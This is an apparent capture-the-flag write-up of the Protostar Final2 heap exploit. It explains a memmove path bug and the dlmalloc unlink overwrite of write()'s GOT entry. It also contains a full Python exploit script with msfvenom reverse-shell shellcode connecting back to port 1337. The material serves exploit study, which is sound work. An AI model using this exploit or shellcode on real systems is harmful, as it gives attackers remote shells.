### Final2 Remote Heap Exploit

- Check Path function Analysis

    ```
    void check_path(char *buf)
    {
        char *start;
        char *p;
        int l;
        
        /*
        * Work out old software bug
        */
        
        p = rindex(buf, '/');
        l = strlen(p);
        if(p) {
            start = strstr(buf, "ROOT");
            if(start) {
                while(*start != '/') start--;
                memmove(start, p, l);
                printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
                "yes" : "no", start - buf);
            }
        }
    }
    ```
      
  1. `p = rindex(buf, '/');` returns pointer to the last occurence of `/`

     ```
     Given /lol/ROOT/blah, return pointer to /lol/ROOT/blah
                                                      ^
                                                      |
                                                pointer here
     ```

  2. `l = strlen(p);` gets the length of the value that p is pointing to (i.e. length of `blah` in this context but it would refer to the length of the string after the last `/`)

  3. `start = strstr(buf, "ROOT");` finds the STARTING index of the substring of `ROOT`

  4. `while(*start != '/') start--;` decrement start variable till it finds the first `/` before `ROOT`

  5. `memmove(start, p, l);` moves the data starting from the starting address pointed by `p` to the ending address indicated by `l` to the memory address pointed by the `start` pointer (i.e. `/lol/ROOT/blah` &rarr; `/lol/blah/blah`). 

  6. Disassembling the check path function we observe that memmove() references esp registers for its parameters

        ```
        (gdb) disassemble check_path
        Dump of assembler code for function check_path:
        0x0804bcd0 <check_path+0>:	push   ebp
        0x0804bcd1 <check_path+1>:	mov    ebp,esp
        0x0804bcd3 <check_path+3>:	sub    esp,0x28
        0x0804bcd6 <check_path+6>:	mov    DWORD PTR [esp+0x4],0x2f
        0x0804bcde <check_path+14>:	mov    eax,DWORD PTR [ebp+0x8]
        0x0804bce1 <check_path+17>:	mov    DWORD PTR [esp],eax
        0x0804bce4 <check_path+20>:	call   0x8048f7c <rindex@plt>
        0x0804bce9 <check_path+25>:	mov    DWORD PTR [ebp-0x10],eax
        0x0804bcec <check_path+28>:	mov    eax,DWORD PTR [ebp-0x10]
        0x0804bcef <check_path+31>:	mov    DWORD PTR [esp],eax
        0x0804bcf2 <check_path+34>:	call   0x8048edc <strlen@plt>
        0x0804bcf7 <check_path+39>:	mov    DWORD PTR [ebp-0xc],eax
        0x0804bcfa <check_path+42>:	cmp    DWORD PTR [ebp-0x10],0x0
        0x0804bcfe <check_path+46>:	je     0x804bd45 <check_path+117>
        0x0804bd00 <check_path+48>:	mov    DWORD PTR [esp+0x4],0x804c2cc
        0x0804bd08 <check_path+56>:	mov    eax,DWORD PTR [ebp+0x8]
        0x0804bd0b <check_path+59>:	mov    DWORD PTR [esp],eax
        0x0804bd0e <check_path+62>:	call   0x8048f4c <strstr@plt>
        0x0804bd13 <check_path+67>:	mov    DWORD PTR [ebp-0x14],eax
        0x0804bd16 <check_path+70>:	cmp    DWORD PTR [ebp-0x14],0x0
        0x0804bd1a <check_path+74>:	je     0x804bd45 <check_path+117>
        0x0804bd1c <check_path+76>:	jmp    0x804bd22 <check_path+82>
        0x0804bd1e <check_path+78>:	sub    DWORD PTR [ebp-0x14],0x1
        0x0804bd22 <check_path+82>:	mov    eax,DWORD PTR [ebp-0x14]
        0x0804bd25 <check_path+85>:	movzx  eax,BYTE PTR [eax]
        0x0804bd28 <check_path+88>:	cmp    al,0x2f
        0x0804bd2a <check_path+90>:	jne    0x804bd1e <check_path+78>
        0x0804bd2c <check_path+92>:	mov    eax,DWORD PTR [ebp-0xc]
        0x0804bd2f <check_path+95>:	mov    DWORD PTR [esp+0x8],eax
        0x0804bd33 <check_path+99>:	mov    eax,DWORD PTR [ebp-0x10]
        0x0804bd36 <check_path+102>:	mov    DWORD PTR [esp+0x4],eax
        0x0804bd3a <check_path+106>:	mov    eax,DWORD PTR [ebp-0x14]
        0x0804bd3d <check_path+109>:	mov    DWORD PTR [esp],eax
        0x0804bd40 <check_path+112>:	call   0x8048f8c <memmove@plt>
        0x0804bd45 <check_path+117>:	leave  
        0x0804bd46 <check_path+118>:	ret    
        End of assembler dump.
        ```

- Get Request function Analysis

    ```
    int get_requests(int fd)
    {
        char *buf;
        char *destroylist[256];
        int dll;
        int i;
        
        dll = 0;
        while(1) {
            if(dll >= 255) break;
        
            buf = calloc(REQSZ, 1);
            if(read(fd, buf, REQSZ) != REQSZ) break;
        
            if(strncmp(buf, "FSRD", 4) != 0) break;
        
            check_path(buf + 4);     
        
            dll++;
        }
        
        for(i = 0; i < dll; i++) {
            write(fd, "Process OK\n", strlen("Process OK\n"));
            free(destroylist[i]);
        }
    }
    ```
    
  1. `buf = calloc(REQSZ, 1);` allocates 256 bytes of memory in heap and returns pointer to `buf`

  2. `if(read(fd, buf, REQSZ) != REQSZ) break;` ensures that the input we are reading is 256 bytes long

  3. `if(strncmp(buf, "FSRD", 4) != 0) break;` ensures that the 1st 4 chars of our input is equal to FSRD
    
- Exploit methodology: unsafe code + `memmove()` which calls `free()`

  1. Realise that during the while-loop in search of the first `/` after the last `/`, if we do not specify a proper path (e.g. `AAAAROOTBBBB/CCCC`) then the function will continue to look through the buffer behind the input and only stop at the first `/` it finds, before performing a memmove() and overwriting that segment of the buffer with `/CCCC` from our original input.

  2. We can send 2 payloads, one with slashes and one with data. The first payload will inject the heap with slashes. The second payload will crafted in a way whereby the while-loop will reach the slashes as injected by the first payload
  
  3. After the while-loop chunk exits, we will iterate through a for loop and start to write "Process OK" messages and free our heap
  
      ```
      for(i = 0; i < dll; i++) {
        write(fd, "Process OK\n", strlen("Process OK\n"));
        free(destroylist[i]);
      }
      ```
      
  4. What you have to do now is that using the free() function call on the first iteration of the for-loop, we have to overwrite the write function in the GOT table to redirect code execution as we did in heap3 such that on the second iteration of the for-loop (there will be 2 iterations since we sent 2 payloads), we will be able to call our redirected code when the write() function is called as it has already been overwritten by the initial first free() function call.
  
- Analyzing the _int_free() function call within the malloc.c source code:

    ```
    ...
    else if (!chunk_is_mmapped(p)) {
    nextchunk = chunk_at_offset(p, size);
    nextsize = chunksize(nextchunk);
    assert(nextsize > 0);

    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(p, bck, fwd);
    }

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        unlink(nextchunk, bck, fwd);
        size += nextsize;
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

    ...
    ```

    1. Given that the size memory address of the first chunk we are freeing is at 0x89, we skip the first if-block as the prev-inuse bit is set (last bit)

    2. We then check whether the next chunk is in use or not. It should not be in use as the program will refer look at the size of the next next chunk located at 0x804e08c - 0x4 (same as 0x804e08c + 0xfffffffc) which should also be a 0xfffffffc. All of this is a result of abusing and exploiting the poorly written code where memmove() is called.

    3. As the next chunk is not in use, we will unlink the next chunk and thereby successfully abusing the dlmalloc unlink() exploit

    4. Once we can redirect code execution to different sections of our heap, we can inject shellcode in our first payload and use the unlink() exploit to overwrite the write function in the GOT table to point to the beginning address of the shellcode in our first payload

    5. After we have successfully redirected code execution, we realise that we have not enough space for our shellcode as a result from the free() function which calls unlink() which inevitably mangles without shellcode. We can use redirect code execution to another segment of the heap where there is more space using `jmp VALUE` or `mov eax, ADDRESS` as you will see below.

- Answer:

    ```
    import socket
    import struct
    import time
    import telnetlib

    HOST="127.0.0.1"
    PORT=2993

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    _WRITE=struct.pack("I", 0x804d41c-0xc)
    _HEAP=struct.pack("I", 0x804e014)

    def pad(_input, _char):
        temp = "FSRD" + _input
        return temp + (128 - len(temp)) * _char

    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.18.5 LPORT=1337 -f python -e x86/shikata_ga_nai

    buf = "\xba\xdf\xb5\xbd\xee\xdb\xdd\xd9\x74\x24\xf4\x58\x33"
    buf += "\xc9\xb1\x12\x31\x50\x12\x03\x50\x12\x83\x37\x49\x5f"
    buf += "\x1b\xf6\x69\x57\x07\xab\xce\xcb\xa2\x49\x58\x0a\x82"
    buf += "\x2b\x97\x4d\x70\xea\x97\x71\xba\x8c\x91\xf4\xbd\xe4"
    buf += "\xe1\xaf\x2c\xf1\x89\xad\x50\xfc\x70\x3b\xb1\x4e\xe4"
    buf += "\x6b\x63\xfd\x5a\x88\x0a\xe0\x50\x0f\x5e\x8a\x04\x3f"
    buf += "\x2c\x22\xb1\x10\xfd\xd0\x28\xe6\xe2\x46\xf8\x71\x05"
    buf += "\xd6\xf5\x4c\x46"

    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f python -e x86/shikata_ga_nai

    buf = "\xdb\xcf\xb8\x5c\x20\x9f\x3f\xd9\x74\x24\xf4\x5d\x29"
    buf += "\xc9\xb1\x12\x31\x45\x17\x83\xed\xfc\x03\x19\x33\x7d"
    buf += "\xca\x90\xe8\x76\xd6\x81\x4d\x2a\x73\x27\xdb\x2d\x33"
    buf += "\x41\x16\x2d\xa7\xd4\x18\x11\x05\x66\x11\x17\x6c\x0e"
    buf += "\xdd\xe7\x8e\xcf\x49\xea\x8e\xca\xb0\x63\x6f\x64\xa4"
    buf += "\x23\x21\xd7\x9a\xc7\x48\x36\x11\x47\x18\xd0\xc4\x67"
    buf += "\xee\x48\x71\x57\x3f\xea\xe8\x2e\xdc\xb8\xb9\xb9\xc2"
    buf += "\x8c\x35\x77\x84"

    INTERRUPT = "\xCC"

    NOP_SLED_1 = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    JMP_0XC = "\xeb\x0a" # obtained from tutorial, jmp 0xc addresses from current address at 0x804e014 to 0x804e020
    PAYLOAD_1_1 = pad("/ROOT/AA" + JMP_0XC + NOP_SLED_1 + buf, "/")
    PAYLOAD_2_1 = pad("ROOT/" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + _WRITE + _HEAP, "\x00")

    NOP_SLED_2 = "\x90\x90\x90\x90\x90"
    MOV_JMP_EAX_0x804e020 = "\xB8\x20\xE0\x04\x08\xFF\xE0"
    MOV_JMP_EAX_0x804e098 = "\xB8\x98\xE0\x04\x08\xFF\xE0"
    MOV_CALL_EAX_0x804e098 = "\xB8\x98\xE0\x04\x08\xFF\xD0"
    PAYLOAD_1_2 = pad("/ROOT/AA" + MOV_CALL_EAX_0x804e098 + NOP_SLED_2 + buf, "/")
    PAYLOAD_2_2 = pad("ROOT/" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + _WRITE + _HEAP + buf + "\x00\x00\x00\x00", "\x00")

    s.send(PAYLOAD_1_2)
    s.send(PAYLOAD_2_2)


    #t = telnetlib.Telnet()
    #t.sock = s
    #t.interact()
    ```

- Debugging/Testing

    1. Given FSRD/ROOTAAAAA.....

        ```
        (gdb) info registers
        eax            0x804e00c	134537228
        ecx            0x52	82
        edx            0x804e00c	134537228
        ebx            0xb7fd7ff4	-1208123404
        esp            0xbffff830	0xbffff830
        ebp            0xbffff858	0xbffff858
        esi            0x0	0
        edi            0x0	0
        eip            0x804bd40	0x804bd40 <check_path+112>
        eflags         0x200246	[ PF ZF IF ID ]
        cs             0x73	115
        ss             0x7b	123
        ds             0x7b	123
        es             0x7b	123
        fs             0x0	0
        gs             0x33	51
        (gdb) x $eax
        0x804e00c:	0x4f4f522f
        (gdb) x $esp
        0xbffff830:	0x0804e00c
        (gdb) x 0x0804e00c
        0x804e00c:	0x4f4f522f

        0x4f4f522f translates to /ROO
        ```

    2. Location of write function in got table

        ```
        (gdb) x 0x8048dfc
        0x8048dfc <write@plt>:	0xd41c25ff
        (gdb) disassemble 0x8048dfc
        Dump of assembler code for function write@plt:
        0x08048dfc <write@plt+0>:	jmp    DWORD PTR ds:0x804d41c
        0x08048e02 <write@plt+6>:	push   0x68
        0x08048e07 <write@plt+11>:	jmp    0x8048d1c
        End of assembler dump.
        ```

    3. `.gdbinit` file to auto run on gdb start

        ```
        set disassembly-flavor intel
        set follow-fork-mode child
        set pagination off

        break *0x0804bd40
        break *0x0804be13
        ```

    4. For the following debugging logs in gdb when using int3 interrupt opcode "\xCC", next instruction to execute is at 0x0804e02a and is currently at 0x0804e029

        ```
        Program received signal SIGTRAP, Trace/breakpoint trap.
        0x0804e02a in ?? ()
        (gdb) c
        Continuing.

        ```

### References

https://stackoverflow.com/questions/775108/x86-jump-to-an-address

https://73696e65.github.io/2015/07/exploit-exercises-protostar-final-levels

https://cocomelonc.github.io/pwn/2021/10/19/buffer-overflow-1.html

https://c9x.me/x86/html/file_module_x86_id_147.html

https://defuse.ca/online-x86-assembler.htm#disassembly
